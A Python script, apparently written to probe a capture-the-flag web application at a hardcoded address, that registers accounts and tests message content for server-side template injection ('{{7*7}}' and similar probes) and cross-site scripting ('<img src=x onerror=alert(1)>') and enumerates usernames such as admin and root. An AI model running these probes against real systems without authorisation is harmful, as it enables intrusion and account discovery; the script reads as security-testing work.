import requests
import re

base = 'http://154.57.164.80:31506'

# Register and login with a fresh user
s = requests.Session()
s.post(f'{base}/register', data={'username': 'attacker99', 'password': 'pass123'})
s.post(f'{base}/login', data={'username': 'attacker99', 'password': 'pass123'})

# Check the full message view page structure
r = s.post(f'{base}/messages', data={'to_username': 'attacker99', 'content': 'hello test'}, allow_redirects=False)
r2 = s.get(f'{base}/')
print("=== INBOX ===")
print(r2.text)

# Find message IDs
ids = re.findall(r'/messages/(\d+)', r2.text)
print(f"\nMessage IDs found: {ids}")

if ids:
    r3 = s.get(f'{base}/messages/{ids[0]}')
    print(f"\n=== MESSAGE {ids[0]} ===")
    print(r3.text)

# Test SSTI - send message with template injection
print("\n\n=== TESTING SSTI ===")
ssti_payloads = [
    '{{7*7}}',
    '${7*7}',
    '<%= 7*7 %>',
    '#{7*7}',
    '{7*7}',
    '{{constructor.constructor("return this")()}}',
]

for payload in ssti_payloads:
    s2 = requests.Session()
    s2.post(f'{base}/register', data={'username': f'ssti_{hash(payload) % 10000}', 'password': 'pass123'})
    s2.post(f'{base}/login', data={'username': f'ssti_{hash(payload) % 10000}', 'password': 'pass123'})
    
    r = s2.post(f'{base}/messages', data={'to_username': f'ssti_{hash(payload) % 10000}', 'content': payload}, allow_redirects=True)
    
    # Check inbox for rendered content
    r2 = s2.get(f'{base}/')
    msg_ids = re.findall(r'/messages/(\d+)', r2.text)
    if msg_ids:
        r3 = s2.get(f'{base}/messages/{msg_ids[0]}')
        # Check if payload was rendered
        if '49' in r3.text and payload in ['{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}', '{7*7}']:
            print(f'  SSTI FOUND! Payload: {payload}')
            print(f'  Response: {r3.text[:500]}')
        elif payload not in r3.text:
            print(f'  Payload {payload!r} was transformed in response!')
            # Show snippet around expected content
            print(f'  Response snippet: {r3.text[r3.text.find("scroll-body"):r3.text.find("scroll-body")+200] if "scroll-body" in r3.text else r3.text[:300]}')
        else:
            print(f'  Payload {payload!r} reflected as-is (no SSTI)')

# Test XSS
print("\n\n=== TESTING MESSAGE CONTENT HANDLING ===")
xss_payload = '<img src=x onerror=alert(1)>'
s3 = requests.Session()
s3.post(f'{base}/register', data={'username': 'xsstest99', 'password': 'pass123'})
s3.post(f'{base}/login', data={'username': 'xsstest99', 'password': 'pass123'})
s3.post(f'{base}/messages', data={'to_username': 'xsstest99', 'content': xss_payload}, allow_redirects=True)
r = s3.get(f'{base}/')
msg_ids = re.findall(r'/messages/(\d+)', r.text)
if msg_ids:
    r3 = s3.get(f'{base}/messages/{msg_ids[0]}')
    if '<img src=x' in r3.text:
        print('XSS: payload reflected unescaped!')
    else:
        print('XSS: payload was escaped/sanitized')
    # Show how the content appears
    idx = r3.text.find('scroll-body')
    if idx > -1:
        print(f'Content area: {r3.text[idx:idx+300]}')

# Test path traversal on to_username
print("\n\n=== TESTING USERNAME ENUMERATION ===")
# Try sending message to common usernames
common_users = ['admin', 'root', 'administrator', 'flag', 'rookery', 'user', 'test', 'guest', 'raven', 'crow']
for user in common_users:
    s4 = requests.Session()
    s4.post(f'{base}/login', data={'username': 'attacker99', 'password': 'pass123'})
    r = s4.post(f'{base}/messages', data={'to_username': user, 'content': 'test'}, allow_redirects=False)
    loc = r.headers.get('Location', '')
    # Check if error message
    if r.status_code == 302 and loc == '/':
        print(f'  User {user!r:20} -> message sent (user exists!)')
    elif r.status_code == 302:
        r5 = s4.get(f'{base}{loc}')
        if 'error' in r5.text.lower() or 'not found' in r5.text.lower():
            print(f'  User {user!r:20} -> does NOT exist')
        else:
            print(f'  User {user!r:20} -> redirect to {loc}')
    else:
        # Check body for error
        print(f'  User {user!r:20} -> status={r.status_code}')
        if r.status_code != 302:
            print(f'    Body: {r.text[:200]}')
